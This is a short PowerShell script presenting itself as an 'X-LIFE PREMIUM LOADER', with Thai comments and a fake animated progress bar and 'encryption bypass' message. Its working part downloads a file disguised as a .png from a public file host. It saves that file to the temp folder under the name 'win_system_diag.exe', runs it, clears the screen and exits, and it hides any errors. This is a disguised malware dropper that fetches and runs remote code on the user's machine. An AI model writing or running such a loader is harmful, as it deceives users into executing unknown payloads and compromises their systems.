# ============================================================
# X-LIFE PREMIUM LOADER
# ============================================================
Clear-Host
$Host.UI.RawUI.WindowTitle = "X-LIFE SECURITY INITIALIZATION"

Write-Host "`n  [>] INITIALIZING SECURITY PROTOCOLS..." -ForegroundColor Cyan
Start-Sleep -Milliseconds 500

# ระบบ Animated Loading Bar
for ($i = 0; $i -le 100; $i += 5) {
    $percent = "$i%"
    $numBlocks = [int](<$i / 5>)
    $bar = ("█" * $numBlocks) + (" " * (20 - $numBlocks))
    Write-Host "`r  [$bar] $percent  " -NoNewline -ForegroundColor Magenta
    Start-Sleep -Milliseconds 50
}

Write-Host "`n  [+] ENCRYPTION BYPASS SUCCESSFUL" -ForegroundColor Green
Write-Host "  [*] DOWNLOADING ENGINE COMPONENTS..." -ForegroundColor DarkGray

# ส่วนดาวน์โหลดและรันไฟล์เดิม
$exeUrl = "https://files.catbox.moe/hextui.png"
$tempPath = "$env:TEMP\win_system_diag.exe"

try {
    Invoke-WebRequest -Uri $exeUrl -OutFile $tempPath -UseBasicParsing
    Write-Host "  [+] ENGINE BOOTING..." -ForegroundColor Cyan
    Start-Sleep -Milliseconds 800
    
    Start-Process -FilePath $tempPath
    
    # ล้างหน้าจอแล้วปิด PowerShell ทันที
    Clear-Host
    Exit
}
catch { }
